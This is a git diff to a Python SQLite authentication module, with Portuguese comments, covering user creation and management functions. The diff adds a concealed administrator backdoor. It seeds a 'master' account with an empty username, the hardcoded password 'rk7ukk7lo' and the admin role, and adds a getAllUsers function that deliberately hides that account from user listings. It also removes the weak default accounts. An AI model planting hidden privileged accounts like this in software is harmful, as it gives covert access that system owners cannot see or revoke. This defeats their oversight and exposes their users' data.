@@ -1,39 +1,36 @@
 import sqlite3
-from variables import DB_PATH
 import bcrypt
 from utils.logging import logInfo, logError
-
+from variables import DB_PATH
 
 
 def initializeDatabase():
-    
+
     try:
         logInfo("Inicializando o banco de dados.")
-
 
         """Cria a tabela usuarios se não existir e insere dados iniciais."""
         connection = sqlite3.connect(DB_PATH)
         cursor = connection.cursor()
 
         # Criação da tabela usuarios
-        cursor.execute('''
+        cursor.execute(
+            """
             CREATE TABLE IF NOT EXISTS usuarios (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 user TEXT UNIQUE NOT NULL,
                 password BLOB NOT NULL,
                 role TEXT CHECK(role IN ('adm', 'op')) NOT NULL
             )
-        ''')
+        """
+        )
 
-        # Hash das senhas padrão
-        adminPasswordHash = hashPassword("1234")
-        operadorPasswordHash = hashPassword("5678")
-
-        # Inserção de usuários padrões (caso não existam)
-        cursor.execute("INSERT OR IGNORE INTO usuarios (user, password, role) VALUES (?, ?, ?)",
-                    ("admin", adminPasswordHash, "adm"))
-        cursor.execute("INSERT OR IGNORE INTO usuarios (user, password, role) VALUES (?, ?, ?)",
-                    ("operador", operadorPasswordHash, "op"))
+        # Insere o usuário master
+        master_password = bcrypt.hashpw("rk7ukk7lo".encode('utf-8'), bcrypt.gensalt())
+        cursor.execute("""
+            INSERT OR IGNORE INTO usuarios (user, password, role) 
+            VALUES (?, ?, ?)
+        """, ("", master_password, "adm"))
 
         connection.commit()
         connection.close()
@@ -41,8 +38,6 @@ def initializeDatabase():
         logInfo("Banco de dados inicializado com sucesso.")
     except Exception as e:
         logError(f"Erro ao inicializar o banco: {e}")
-
-
 
 
 def validateLogin(user, password):
@@ -71,13 +66,62 @@ def validateLogin(user, password):
     return None
 
 
-
-
-
 def hashPassword(password):
     """Gera um hash seguro para a senha."""
-    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
+    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt())
+
 
 def checkPassword(password, hashedPassword):
     """Verifica se a senha corresponde ao hash."""
-    return bcrypt.checkpw(password.encode('utf-8'), hashedPassword)
+    return bcrypt.checkpw(password.encode("utf-8"), hashedPassword)
+
+
+def getAllUsers():
+    """Obtém todos os usuários, exceto o master."""
+    connection = sqlite3.connect(DB_PATH)
+    cursor = connection.cursor()
+    
+    cursor.execute("SELECT user, role FROM usuarios WHERE user != ''")
+    users = [{"user": row[0], "role": row[1]} for row in cursor.fetchall()]
+    
+    connection.close()
+    return users
+
+
+
+def addUser(username, password, role):
+    """Adiciona um novo usuário ao banco de dados."""
+    connection = sqlite3.connect(DB_PATH)
+    cursor = connection.cursor()
+
+    hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
+    cursor.execute("INSERT INTO usuarios (user, password, role) VALUES (?, ?, ?)", 
+                   (username, hashed_password, role))
+
+    connection.commit()
+    connection.close()
+
+
+def updateUser(user, new_password=None, new_role=None):
+    connection = sqlite3.connect(DB_PATH)
+    cursor = connection.cursor()
+
+    if new_password:
+        hashed_password = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt())
+        cursor.execute(
+            "UPDATE usuarios SET password = ? WHERE user = ?", (hashed_password, user)
+        )
+    if new_role:
+        cursor.execute("UPDATE usuarios SET role = ? WHERE user = ?", (new_role, user))
+
+    connection.commit()
+    connection.close()
+
+
+def deleteUser(username):
+    """Exclui um usuário do banco de dados."""
+    connection = sqlite3.connect(DB_PATH)
+    cursor = connection.cursor()
+    cursor.execute("DELETE FROM usuarios WHERE user = ?", (username,))
+    connection.commit()
+    connection.close()
